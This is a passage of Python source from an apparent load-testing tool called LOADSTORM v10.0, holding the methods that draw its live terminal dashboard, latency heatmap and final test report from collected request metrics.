    def _print_heatmap(self, max_cols: int = 24) -> List[Tuple[str, str]]:
        hist = list(self.metrics.heatmap_history)[-max_cols:]
        if not hist:
            return []
        max_count = 1
        for col in hist:
            for v in col.values():
                if v > max_count:
                    max_count = v
        shades = ' .:-=+*#%@'
        rows = []
        for band in LATENCY_BAND_LABELS:
            cells = ''
            for col in hist:
                v = col.get(band, 0)
                if v <= 0:
                    cells += '.'
                else:
                    cells += shades[min(9, 1 + int((v / max_count) * 8))]
            rows.append((band, cells))
        return rows

    def _print_live(self):
        m = self.metrics
        s = m.snapshot()
        dur = s['dur']
        prog = min(1.0, dur / self.cfg['duration']) if self.cfg['duration'] > 0 else 1.0
        bar_w = 30
        filled = int(bar_w * prog)
        bar = f"{Fore.GREEN}{'#' * filled}{Fore.RED}{'-' * (bar_w - filled)}"

        eta = self._print_eta(dur, prog)

        rps_hist = list(m.rps_per_second)[-20:]
        if rps_hist:
            max_r = max(rps_hist) if max(rps_hist) > 0 else 1
            sparks = ' .:-=+*#%@'
            spark = ''.join([sparks[min(9, int(v / max_r * 9))] for v in rps_hist])
        else:
            spark = '.' * 20

        urls_count = len(self.cfg.get('urls', [self.cfg['url']]))
        mode = f"Multi-URL ({urls_count} targets)" if urls_count > 1 else "Single URL"
        if self.cfg.get('websocket'):
            mode = "WebSocket"
        if self.cfg.get('scenarios'):
            mode = f"Scenario Chain ({len(self.cfg['scenarios'])} steps)"
        if self.cfg.get('http2'):
            mode += " [HTTP/2]"

        err_counts = s['error_type_counts']
        err_parts = []
        for etype, ecount in err_counts.items():
            if ecount > 0 and etype not in ('http_4xx', 'http_5xx'):
                err_parts.append(f"{etype}:{ecount}")
        err_str = ' '.join(err_parts[:4]) if err_parts else 'none'

        throughput_spark = self._print_throughput_graph(20)

        r10 = s['rolling_10s']
        r30 = s['rolling_30s']
        r60 = s['rolling_60s']

        lines = []
        lines.append(f"\r    {Fore.CYAN}{Style.BRIGHT}+{'='*78}+{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}{Style.BRIGHT}LOADSTORM v10.0 LIVE DASHBOARD{Style.RESET_ALL}{' '*47}{Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}+{'='*78}+{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.YELLOW}Target:{Style.RESET_ALL}  {Fore.WHITE}{self.cfg['url'][:60]:<60} {Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.YELLOW}Mode:{Style.RESET_ALL}    {Fore.GREEN}{mode:<16}{Style.RESET_ALL}  {Fore.YELLOW}Pattern:{Style.RESET_ALL} {Fore.GREEN}{self.cfg['pattern'].value:<12}{Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.YELLOW}Users:{Style.RESET_ALL}    {Fore.WHITE}{self.cfg['users']:>12,}{Style.RESET_ALL}  {Fore.YELLOW}Elapsed:{Style.RESET_ALL} {Fore.WHITE}{dur:>6.1f}s/{self.cfg['duration']}s{Style.RESET_ALL}  {Fore.YELLOW}ETA:{Style.RESET_ALL} {Fore.WHITE}{eta}{Style.RESET_ALL}{' '*(8-len(eta))}{Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}+{'='*78}+{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  [{bar}] {prog*100:5.1f}%  ETA {eta}{' '*(24-len(eta))}{Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}+{'='*78}+{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.GREEN}+OK:{Style.RESET_ALL} {s['ok']:>10,}  {Fore.RED}-FAIL:{Style.RESET_ALL} {s['fail']:>10,}  {Fore.YELLOW}TOTAL:{Style.RESET_ALL} {s['total']:>10,}  {Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.MAGENTA}ACTIVE:{Style.RESET_ALL} {s['active']:>8,}  {Fore.CYAN}RPS:{Style.RESET_ALL} {s['rps']:>10,.1f}  {Fore.WHITE}PEAK:{Style.RESET_ALL} {s['peak']:>8,.1f}    {Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}THROUGHPUT:{Style.RESET_ALL} {s['mbps']:>8.2f} MB/s  {Fore.YELLOW}RATE:{Style.RESET_ALL} {s['rate']:>6.2f}%  {Fore.RED}ERR:{Style.RESET_ALL} {s['error_rate']:>5.2f}%  {Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}BANDWIDTH:{Style.RESET_ALL} {Fore.GREEN}TX:{Style.RESET_ALL} {s['mbps_sent']:>6.2f} MB/s  {Fore.RED}RX:{Style.RESET_ALL} {s['mbps_recv']:>6.2f} MB/s  {Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}+{'='*78}+{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}{Style.BRIGHT}ROLLING WINDOW STATS{Style.RESET_ALL}{' '*53}{Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.CYAN}10s:{Style.RESET_ALL} RPS={r10['rps']:>7.1f} Avg={r10['avg_ms']:>7.1f}ms P95={r10['p95_ms']:>7.1f}ms Err={r10['error_rate']:>5.1f}%  {Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.GREEN}30s:{Style.RESET_ALL} RPS={r30['rps']:>7.1f} Avg={r30['avg_ms']:>7.1f}ms P95={r30['p95_ms']:>7.1f}ms Err={r30['error_rate']:>5.1f}%  {Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.YELLOW} 1m:{Style.RESET_ALL} RPS={r60['rps']:>7.1f} Avg={r60['avg_ms']:>7.1f}ms P95={r60['p95_ms']:>7.1f}ms Err={r60['error_rate']:>5.1f}%  {Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}+{'='*78}+{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}{Style.BRIGHT}RESPONSE TIMES (ms){Style.RESET_ALL}{' '*57}{Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.GREEN}Avg:{Style.RESET_ALL} {s['avg']:>8.1f}  {Fore.YELLOW}Med:{Style.RESET_ALL} {s['median']:>8.1f}  {Fore.CYAN}SD:{Style.RESET_ALL} {s['stddev']:>8.1f}  {Fore.WHITE}P50:{Style.RESET_ALL} {s['p50']:>7.1f}  {Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.MAGENTA}P90:{Style.RESET_ALL} {s['p90']:>8.1f}  {Fore.RED}P95:{Style.RESET_ALL} {s['p95']:>8.1f}  {Fore.RED}P99:{Style.RESET_ALL} {s['p99']:>8.1f}  {Fore.WHITE}P999:{Style.RESET_ALL} {s['p999']:>6.1f}  {Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.GREEN}Min:{Style.RESET_ALL} {s['min']:>8.1f}  {Fore.RED}Max:{Style.RESET_ALL} {s['max']:>8.1f}  {Fore.WHITE}Conn:{Style.RESET_ALL} {s['avg_connect']:>6.1f}  {Fore.WHITE}TTFB:{Style.RESET_ALL} {s['avg_ttfb']:>5.1f}  {Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}+{'='*78}+{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}{Style.BRIGHT}STATISTICAL ANALYSIS (v10.0){Style.RESET_ALL}{' '*49}{Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}Coeff of Var:{Style.RESET_ALL} {s['cv']:>8.3f}  {Fore.WHITE}Outliers(3s):{Style.RESET_ALL} {s['outlier_count']:>8,}  {Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}Conn Reuse Eff:{Style.RESET_ALL} {s['conn_reuse_efficiency']:>6.1f}%{' '*52}{Fore.CYAN}|{Style.RESET_ALL}")
        p95_spark = self._percentile_spark('p95', 24)
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}P95 TREND:{Style.RESET_ALL}     {Fore.YELLOW}{p95_spark}{Style.RESET_ALL}{' '*(57-len(p95_spark))}{Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}+{'='*78}+{Style.RESET_ALL}")

        hs = m.health_score()
        bn = self._realtime_bottleneck()
        conn_h = self.connection_health()
        hs_color = Fore.GREEN if hs.get('score', 0) >= 80 else (Fore.YELLOW if hs.get('score', 0) >= 60 else Fore.RED)
        bn_color = Fore.GREEN if bn.get('severity') == 'healthy' else (Fore.YELLOW if bn.get('severity') == 'mild' else Fore.RED)
        conn_ok = conn_h.get('status', '') in ('healthy', 'no recent samples')
        conn_color = Fore.GREEN if conn_ok else Fore.RED
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}{Style.BRIGHT}V10 HEALTH & BOTTLENECK{Style.RESET_ALL}{' '*52}{Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}Health:{Style.RESET_ALL} {hs_color}{hs.get('score', 0):>5.1f} ({hs.get('grade', '?')}){Style.RESET_ALL}  {Fore.WHITE}Conn:{Style.RESET_ALL} {conn_color}{str(conn_h.get('status', '?'))[:12]:<12}{Style.RESET_ALL}  {Fore.WHITE}ErrPred30s:{Style.RESET_ALL} {Fore.YELLOW}{m.error_rate_prediction().get('predicted_error_rate_30s', 0):>6.2f}%{Style.RESET_ALL}{' '*6}{Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}Bottleneck:{Style.RESET_ALL} {bn_color}{str(bn.get('primary', 'none'))[:24]:<24}{Style.RESET_ALL}  {Fore.WHITE}Conf:{Style.RESET_ALL} {bn.get('confidence', 0):.2f} {' ' * 26}{Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}+{'='*78}+{Style.RESET_ALL}")

        if s.get('val_pass', 0) + s.get('val_fail', 0) > 0:
            lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}{Style.BRIGHT}VALIDATION{Style.RESET_ALL}{' '*66}{Fore.CYAN}|{Style.RESET_ALL}")
            lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.GREEN}Pass:{Style.RESET_ALL} {s['val_pass']:>8,}  {Fore.RED}Fail:{Style.RESET_ALL} {s['val_fail']:>8,}  {Fore.YELLOW}Rate:{Style.RESET_ALL} {s['val_rate']:>6.2f}%{' '*34}{Fore.CYAN}|{Style.RESET_ALL}")
            lines.append(f"    {Fore.CYAN}+{'='*78}+{Style.RESET_ALL}")

        if s.get('ws_msgs', 0) > 0:
            lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}{Style.BRIGHT}WEBSOCKET{Style.RESET_ALL}{' '*68}{Fore.CYAN}|{Style.RESET_ALL}")
            lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.CYAN}Messages:{Style.RESET_ALL} {s['ws_msgs']:>8,}  {Fore.WHITE}Data:{Style.RESET_ALL} {s['ws_bytes']/1024:.2f} KB{' '*40}{Fore.CYAN}|{Style.RESET_ALL}")
            lines.append(f"    {Fore.CYAN}+{'='*78}+{Style.RESET_ALL}")

        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}{Style.BRIGHT}ERROR BREAKDOWN{Style.RESET_ALL}{' '*61}{Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}{err_str:<74}{Fore.CYAN}|{Style.RESET_ALL}")
        if s.get('avg_recovery', 0) > 0:
            lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}Recovery:{Style.RESET_ALL} Avg={s['avg_recovery']:>8.1f}ms  Max={s['max_recovery']:>8.1f}ms{' '*35}{Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}+{'='*78}+{Style.RESET_ALL}")

        hist = self._print_ascii_histogram(s['buckets'], 25)
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}{Style.BRIGHT}LATENCY DISTRIBUTION (ASCII HISTOGRAM){Style.RESET_ALL}{' '*37}{Fore.CYAN}|{Style.RESET_ALL}")
        for label, bar, pct in hist:
            lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {label:>10} {bar} {pct:>5.1f}%{' '*(22-len(bar)+25)}{Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}+{'='*78}+{Style.RESET_ALL}")

        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}{Style.BRIGHT}RPS TREND:{Style.RESET_ALL}     {Fore.CYAN}{spark}{Style.RESET_ALL}{' '*(57-len(spark))}{Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}{Style.BRIGHT}THROUGHPUT:{Style.RESET_ALL}    {Fore.GREEN}{throughput_spark}{Style.RESET_ALL}{' '*(57-len(throughput_spark))}{Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}+{'='*78}+{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.RED}Timeout:{Style.RESET_ALL} {s['tmo']:>8,}  {Fore.RED}Conn:{Style.RESET_ALL} {s['cerr']:>8,}  {Fore.RED}4xx:{Style.RESET_ALL} {s['h4']:>6,}  {Fore.RED}5xx:{Style.RESET_ALL} {s['h5']:>6,} {Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}|{Style.RESET_ALL}  {Fore.WHITE}Data RX:{Style.RESET_ALL} {s['mb_recv']:>8.2f} MB  {Fore.WHITE}TX:{Style.RESET_ALL} {s['mb_sent']:>8.2f} MB  {Fore.WHITE}Conn Reuse:{Style.RESET_ALL} {s['conn_reuse']:>5.1f}%{' '*(5)}{Fore.CYAN}|{Style.RESET_ALL}")
        lines.append(f"    {Fore.CYAN}+{'='*78}+{Style.RESET_ALL}")

        sys.stdout.write('\033[F' * len(lines))
        sys.stdout.write('\n'.join(lines))
        sys.stdout.flush()

    def print_report(self):
        m = self.metrics
        s = m.snapshot()
        dur = s['dur']

        err_counts = s['error_type_counts']
        err_lines = ""
        for etype, ecount in sorted(err_counts.items(), key=lambda x: -x[1]):
            if ecount > 0:
                err_lines += f"    |  {Fore.RED}{etype:>20}:{Style.RESET_ALL} {Fore.RED}{ecount:>14,}{' '*(36-len(f'{ecount:,}'))}{Fore.CYAN}|\n"

        print(f"""
    {Fore.CYAN}{Style.BRIGHT}+{'='*78}+
    |                              {Fore.WHITE}FINAL TEST REPORT{Fore.CYAN}                              |
    +{'='*78}+
    |  {Fore.YELLOW}Target:{Style.RESET_ALL}        {Fore.WHITE}{self.cfg['url'][:63]:<63}{Fore.CYAN}|
    |  {Fore.YELLOW}Pattern:{Style.RESET_ALL}      {Fore.GREEN}{self.cfg['pattern'].value:<12}{Style.RESET_ALL}  {Fore.YELLOW}Duration:{Style.RESET_ALL} {Fore.WHITE}{dur:.2f}s{' '*(48-len(f'{dur:.2f}'))}{Fore.CYAN}|
    |  {Fore.YELLOW}Users:{Style.RESET_ALL}         {Fore.WHITE}{self.cfg['users']:>12,}{' '*(53-len(f'{self.cfg["users"]:>12,}'))}{Fore.CYAN}|
    |  {Fore.YELLOW}Concurrency:{Style.RESET_ALL}    {Fore.WHITE}{self.cfg['concurrency']:>12,}{' '*(53-len(f'{self.cfg["concurrency"]:>12,}'))}{Fore.CYAN}|
    +{'='*78}+
    |  {Fore.WHITE}{Style.BRIGHT}REQUEST STATISTICS{Style.RESET_ALL}{' '*58}{Fore.CYAN}|
    |{'-'*78}|
    |  {Fore.GREEN}+ Total Requests:{Style.RESET_ALL}       {Fore.WHITE}{m.total_requests:>16,}{' '*(44-len(f'{m.total_requests:,}'))}{Fore.CYAN}|
    |  {Fore.GREEN}+ Successful:{Style.RESET_ALL}           {Fore.GREEN}{m.successful:>16,}{' '*(44-len(f'{m.successful:,}'))}{Fore.CYAN}|
    |  {Fore.RED}- Failed:{Style.RESET_ALL}               {Fore.RED}{m.failed:>16,}{' '*(44-len(f'{m.failed:,}'))}{Fore.CYAN}|
    |  {Fore.YELLOW}% Success Rate:{Style.RESET_ALL}         {Fore.YELLOW}{s['rate']:>15.2f}%{' '*(43-len(f'{s["rate"]:>15.2f}'))}{Fore.CYAN}|
    |  {Fore.RED}% Error Rate:{Style.RESET_ALL}           {Fore.RED}{s['error_rate']:>15.2f}%{' '*(43-len(f'{s["error_rate"]:>15.2f}'))}{Fore.CYAN}|
    +{'='*78}+
    |  {Fore.WHITE}{Style.BRIGHT}PERFORMANCE{Style.RESET_ALL}{' '*65}{Fore.CYAN}|
    |{'-'*78}|
    |  {Fore.CYAN}Requests/sec:{Style.RESET_ALL}         {Fore.WHITE}{m.avg_rps:>16,.2f}{' '*(44-len(f'{m.avg_rps:,.2f}'))}{Fore.CYAN}|
    |  {Fore.MAGENTA}Peak RPS:{Style.RESET_ALL}             {Fore.WHITE}{m.peak_rps:>16,.2f}{' '*(44-len(f'{m.peak_rps:,.2f}'))}{Fore.CYAN}|
    |  {Fore.YELLOW}Max Concurrent:{Style.RESET_ALL}       {Fore.WHITE}{m.max_concurrent:>16,}{' '*(44-len(f'{m.max_concurrent:,}'))}{Fore.CYAN}|
    |  {Fore.WHITE}Throughput:{Style.RESET_ALL}           {Fore.WHITE}{s['mbps']:>16.2f} MB/s{' '*(36-len(f'{s["mbps"]:>16.2f}'))}{Fore.CYAN}|
    +{'='*78}+
    |  {Fore.WHITE}{Style.BRIGHT}BANDWIDTH{Style.RESET_ALL}{' '*67}{Fore.CYAN}|
    |{'-'*78}|
    |  {Fore.GREEN}Bytes Sent:{Style.RESET_ALL}       {Fore.WHITE}{m.total_bytes_sent/1024/1024:>16.2f} MB{' '*(36-len(f'{m.total_bytes_sent/1024/1024:.2f}'))}{Fore.CYAN}|
    |  {Fore.GREEN}Bytes Received:{Style.RESET_ALL}   {Fore.WHITE}{m.total_bytes_recv/1024/1024:>16.2f} MB{' '*(36-len(f'{m.total_bytes_recv/1024/1024:.2f}'))}{Fore.CYAN}|
    |  {Fore.GREEN}TX Rate:{Style.RESET_ALL}          {Fore.WHITE}{s['mbps_sent']:>16.2f} MB/s{' '*(36-len(f'{s["mbps_sent"]:>16.2f}'))}{Fore.CYAN}|
    |  {Fore.GREEN}RX Rate:{Style.RESET_ALL}          {Fore.WHITE}{s['mbps_recv']:>16.2f} MB/s{' '*(36-len(f'{s["mbps_recv"]:>16.2f}'))}{Fore.CYAN}|
    +{'='*78}+
    |  {Fore.WHITE}{Style.BRIGHT}RESPONSE TIMES (ms){Style.RESET_ALL}{' '*57}{Fore.CYAN}|
    |{'-'*78}|
    |  {Fore.GREEN}Average:{Style.RESET_ALL}     {Fore.WHITE}{m.avg_response_time:>12.2f}   {Fore.YELLOW}Median:{Style.RESET_ALL} {Fore.GREEN}{m.median_response_time:>12.2f}{' '*(19-len(f'{m.median_response_time:>12.2f}'))}{Fore.CYAN}|
    |  {Fore.CYAN}StdDev:{Style.RESET_ALL}      {Fore.WHITE}{m.stddev_response_time:>12.2f}   {Fore.WHITE}Min:{Style.RESET_ALL}    {Fore.GREEN}{m.min_rt:>12.2f}{' '*(19-len(f'{m.min_rt:>12.2f}'))}{Fore.CYAN}|
    |  {Fore.YELLOW}P50:{Style.RESET_ALL}        {Fore.WHITE}{m.p50:>12.2f}   {Fore.RED}Max:{Style.RESET_ALL}    {Fore.RED}{m.max_rt:>12.2f}{' '*(19-len(f'{m.max_rt:>12.2f}'))}{Fore.CYAN}|
    |  {Fore.MAGENTA}P90:{Style.RESET_ALL}        {Fore.WHITE}{m.p90:>12.2f}                          {' '*(19)}{Fore.CYAN}|
    |  {Fore.RED}P95:{Style.RESET_ALL}        {Fore.WHITE}{m.p95:>12.2f}                          {' '*(19)}{Fore.CYAN}|
    |  {Fore.RED}P99:{Style.RESET_ALL}        {Fore.WHITE}{m.p99:>12.2f}   {Fore.WHITE}P99.9:{Style.RESET_ALL} {Fore.WHITE}{m.p999:>12.2f}{' '*(19-len(f'{m.p999:>12.2f}'))}{Fore.CYAN}|
    +{'='*78}+
    |  {Fore.WHITE}{Style.BRIGHT}TIMING ANALYSIS (v10.0){Style.RESET_ALL}{' '*53}{Fore.CYAN}|
    |{'-'*78}|
    |  {Fore.CYAN}Avg Connect:{Style.RESET_ALL}   {Fore.WHITE}{m.avg_connect_time:>12.2f} ms   {Fore.YELLOW}Avg TTFB:{Style.RESET_ALL}  {Fore.WHITE}{m.avg_ttfb:>12.2f} ms{' '*(17-len(f'{m.avg_ttfb:>12.2f}'))}{Fore.CYAN}|
    |  {Fore.GREEN}Server Proc:{Style.RESET_ALL}   {Fore.WHITE}{m.avg_server_processing:>12.2f} ms   {Fore.YELLOW}Net O/H:{Style.RESET_ALL}   {Fore.WHITE}{m.avg_network_overhead:>12.2f} ms{' '*(17-len(f'{m.avg_network_overhead:>12.2f}'))}{Fore.CYAN}|
    |  {Fore.RED}Avg Recovery:{Style.RESET_ALL}  {Fore.WHITE}{m.avg_error_recovery:>12.2f} ms   {Fore.RED}Max:{Style.RESET_ALL}       {Fore.RED}{m.max_error_recovery:>12.2f} ms{' '*(17-len(f'{m.max_error_recovery:>12.2f}'))}{Fore.CYAN}|
    +{'='*78}+
    |  {Fore.WHITE}{Style.BRIGHT}ROLLING WINDOW STATS{Style.RESET_ALL}{' '*55}{Fore.CYAN}|
    |{'-'*78}|
    |  {Fore.CYAN} 10s:{Style.RESET_ALL} RPS={s['rolling_10s']['rps']:>8.1f}  Avg={s['rolling_10s']['avg_ms']:>8.1f}ms  P95={s['rolling_10s']['p95_ms']:>8.1f}ms  Err={s['rolling_10s']['error_rate']:>5.1f}%  {Fore.CYAN}|{Style.RESET_ALL}|
    |  {Fore.GREEN} 30s:{Style.RESET_ALL} RPS={s['rolling_30s']['rps']:>8.1f}  Avg={s['rolling_30s']['avg_ms']:>8.1f}ms  P95={s['rolling_30s']['p95_ms']:>8.1f}ms  Err={s['rolling_30s']['error_rate']:>5.1f}%  {Fore.CYAN}|{Style.RESET_ALL}|
    |  {Fore.YELLOW}  1m:{Style.RESET_ALL} RPS={s['rolling_60s']['rps']:>8.1f}  Avg={s['rolling_60s']['avg_ms']:>8.1f}ms  P95={s['rolling_60s']['p95_ms']:>8.1f}ms  Err={s['rolling_60s']['error_rate']:>5.1f}%  {Fore.CYAN}|{Style.RESET_ALL}|
    +{'='*78}+
    |  {Fore.WHITE}{Style.BRIGHT}STATISTICAL ANALYSIS (v10.0){Style.RESET_ALL}{' '*49}{Fore.CYAN}|
    |{'-'*78}|
    |  {Fore.WHITE}Coeff of Variation:{Style.RESET_ALL}  {Fore.WHITE}{m.coefficient_of_variation:>12.4f}   {Fore.WHITE}Outliers(3s):{Style.RESET_ALL}   {Fore.RED}{len(m.statistical_outliers):>12,}{' '*(13-len(f'{len(m.statistical_outliers):,}'))}{Fore.CYAN}|
    |  {Fore.WHITE}Conn Reuse Eff:{Style.RESET_ALL}    {Fore.WHITE}{m.connection_reuse_efficiency:>11.2f}%{' '*(54)}{Fore.CYAN}|
    +{'='*78}+
    |  {Fore.WHITE}{Style.BRIGHT}ERRORS & VALIDATION{Style.RESET_ALL}{' '*57}{Fore.CYAN}|
    |{'-'*78}|
    |  {Fore.RED}Timeouts:{Style.RESET_ALL}      {Fore.RED}{m.timeout_errors:>12,}   {Fore.WHITE}Conn Errors:{Style.RESET_ALL}   {Fore.RED}{m.conn_errors:>12,}{' '*(15-len(f'{m.conn_errors:,}'))}{Fore.CYAN}|
    |  {Fore.RED}HTTP 4xx:{Style.RESET_ALL}      {Fore.RED}{m.http_4xx:>12,}   {Fore.WHITE}HTTP 5xx:{Style.RESET_ALL}      {Fore.RED}{m.http_5xx:>12,}{' '*(15-len(f'{m.http_5xx:,}'))}{Fore.CYAN}|
    |  {Fore.WHITE}Conn Reuse:{Style.RESET_ALL}   {Fore.WHITE}{s['conn_reuse']:>11.2f}%   {Fore.WHITE}Reused:{Style.RESET_ALL}      {Fore.WHITE}{m.total_reused_connections:>12,}{' '*(15-len(f'{m.total_reused_connections:,}'))}{Fore.CYAN}|""")

        if err_lines:
            print(f"    |  {Fore.WHITE}{Style.BRIGHT}ERROR BREAKDOWN{Style.RESET_ALL}{' '*61}{Fore.CYAN}|")
            print(f"    |{'-'*78}|")
            print(err_lines, end='')

        if m.validation_passes + m.validation_fails > 0:
            print(f"""    |  {Fore.GREEN}Val Pass:{Style.RESET_ALL}      {Fore.GREEN}{m.validation_passes:>12,}   {Fore.WHITE}Val Fail:{Style.RESET_ALL}      {Fore.RED}{m.validation_fails:>12,}{' '*(15-len(f'{m.validation_fails:,}'))}{Fore.CYAN}|
    |  {Fore.YELLOW}Val Rate:{Style.RESET_ALL}      {Fore.YELLOW}{s['val_rate']:>11.2f}%{' '*(55-len(f'{s["val_rate"]:>11.2f}%'))}{Fore.CYAN}|""")

        if m.websocket_msgs > 0:
            print(f"""    |  {Fore.CYAN}WS Msgs:{Style.RESET_ALL}       {Fore.CYAN}{m.websocket_msgs:>12,}   {Fore.WHITE}WS Data:{Style.RESET_ALL}       {Fore.CYAN}{m.websocket_bytes/1024:>8.2f} KB{' '*(25-len(f'{m.websocket_bytes/1024:.2f}'))}{Fore.CYAN}|""")

        print(f"""    |  {Fore.WHITE}Data Transferred:{Style.RESET_ALL}{' '*(3)}{Fore.WHITE}{m.total_bytes/1024/1024:>12.2f} MB{' '*(35-len(f'{m.total_bytes/1024/1024:.2f}'))}{Fore.CYAN}|
    +{'='*78}+""")

        if m.status_codes:
            print(f"    |  {Fore.WHITE}{Style.BRIGHT}STATUS CODES{Style.RESET_ALL}{' '*63}{Fore.CYAN}|")
            print(f"    |{'-'*78}|")
            for code, count in sorted(m.status_codes.items()):
                color = Fore.GREEN if code.startswith('2') else (Fore.YELLOW if code.startswith('3') else Fore.RED)
                print(f"    |  {color}HTTP {code}:{Style.RESET_ALL} {color}{count:>14,}{' '*(53-len(f'{count:,}'))}{Fore.CYAN}|")

        if len(m.per_url_metrics) > 1:
            print(f"    |  {Fore.WHITE}{Style.BRIGHT}PER-URL BREAKDOWN{Style.RESET_ALL}{' '*58}{Fore.CYAN}|")
            print(f"    |{'-'*78}|")
            for url, data in sorted(m.per_url_metrics.items(), key=lambda x: x[1]['requests'], reverse=True)[:10]:
                avg_t = data['total_time'] / max(1, data['requests'])
                print(f"    |  {Fore.WHITE}{url[:45]:<45}{Style.RESET_ALL} {data['requests']:>8,} reqs {avg_t:>8.1f}ms avg{Fore.CYAN}  |")

        heat_rows = self._print_heatmap(20)
        if heat_rows:
            print(f"    |  {Fore.WHITE}{Style.BRIGHT}RESPONSE TIME HEATMAP (v10.0){Style.RESET_ALL}{' '*47}{Fore.CYAN}|")
            print(f"    |{'-'*78}|")
            for band, cells in heat_rows:
                pad = max(0, 44 - len(cells))
                print(f"    |  {band:>10} |{Fore.CYAN}{cells}{Style.RESET_ALL}|{' ' * pad}{Fore.CYAN}|")

        if m.percentile_history:
            print(f"    |  {Fore.WHITE}{Style.BRIGHT}PERCENTILE TREND OVER TIME (v10.0){Style.RESET_ALL}{' '*41}{Fore.CYAN}|")
            print(f"    |{'-'*78}|")
            for label, key, color in (('P50', 'p50', Fore.GREEN), ('P95', 'p95', Fore.YELLOW), ('P99', 'p99', Fore.RED)):
                spark = self._percentile_spark(key, 40)
                pad = max(0, 48 - len(spark))
                print(f"    |  {Fore.WHITE}{label}:{Style.RESET_ALL} {color}{spark}{Style.RESET_ALL}{' ' * pad}{Fore.CYAN}|")

        clusters = m.analyze_error_clusters()
        if clusters['total_errors']:
            print(f"    |  {Fore.WHITE}{Style.BRIGHT}ERROR CLUSTERING ANALYSIS (v10.0){Style.RESET_ALL}{' '*41}{Fore.CYAN}|")
            print(f"    |{'-'*78}|")
            print(f"    |  {Fore.RED}Errors:{Style.RESET_ALL} {clusters['total_errors']:>8,}  {Fore.WHITE}Clusters:{Style.RESET_ALL} {clusters['cluster_count']:>6,}  {Fore.WHITE}Largest:{Style.RESET_ALL} {clusters['largest_cluster']:>6,}  {Fore.WHITE}Mean:{Style.RESET_ALL} {clusters['mean_cluster_size']:>6.1f}{Fore.CYAN}{' ' * 8}|")
            dom = clusters['dominant_type'] or 'none'
